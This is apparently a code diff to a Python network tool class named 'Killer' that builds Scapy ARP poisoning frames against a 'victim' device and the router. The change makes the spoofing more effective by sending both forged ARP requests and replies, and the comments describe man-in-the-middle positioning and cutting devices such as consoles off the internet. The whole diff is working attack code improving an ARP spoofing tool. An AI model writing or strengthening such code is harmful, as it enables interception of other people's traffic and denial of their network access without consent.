@@ -467,27 +467,46 @@ class Killer:
     def _poison_frames(self, victim):
         """Unicast ARP poison only (victim + router).
 
-        Do **not** broadcast gateway impersonation on Wi‑Fi. A ff:ff:ff ARP with
-        ``psrc=router`` teaches every listening Wi‑Fi client that this PC is the
-        gateway — phones/laptops lose internet while a wired PS5 may stay up
-        (common PC‑Wi‑Fi + console‑Ethernet layouts, including modem+router).
-        Unicast to the victim/router MACs is enough for MITM when L2 allows it.
+        Do **not** broadcast gateway impersonation. A ff:ff:ff ARP with
+        ``psrc=router`` teaches every listening client that this PC is the
+        gateway and can drop whole-LAN internet.
+
+        Send both ARP *request* (op=1) and *reply* (op=2) unicast to the
+        victim and router. Many stacks ignore unsolicited unicast replies but
+        still cache the sender mapping from a request — reply-only poison was
+        too weak after broadcast removal.
         """
-        to_victim = Ether(dst=victim['mac']) / ARP(
+        # Victim: "router is at PC MAC"
+        to_victim_req = Ether(dst=victim['mac']) / ARP(
+            op=1,
+            psrc=self.router['ip'],
+            hwsrc=self.iface.mac,
+            pdst=victim['ip'],
+            hwdst=victim['mac'],
+        )
+        to_victim_reply = Ether(dst=victim['mac']) / ARP(
             op=2,
             psrc=self.router['ip'],
             hwsrc=self.iface.mac,
             pdst=victim['ip'],
             hwdst=victim['mac'],
         )
-        to_router = Ether(dst=self.router['mac']) / ARP(
+        # Router: "victim is at PC MAC"
+        to_router_req = Ether(dst=self.router['mac']) / ARP(
+            op=1,
+            psrc=victim['ip'],
+            hwsrc=self.iface.mac,
+            pdst=self.router['ip'],
+            hwdst=self.router['mac'],
+        )
+        to_router_reply = Ether(dst=self.router['mac']) / ARP(
             op=2,
             psrc=victim['ip'],
             hwsrc=self.iface.mac,
             pdst=self.router['ip'],
             hwdst=self.router['mac'],
         )
-        return [to_victim, to_router]
+        return [to_victim_req, to_victim_reply, to_router_req, to_router_reply]
 
     def _poison_arp_now(self, victim, seq=0, repeats=1, delay_s=0.0):
         """Best-effort immediate ARP poison burst; aborts if a newer op supersedes this sequence.
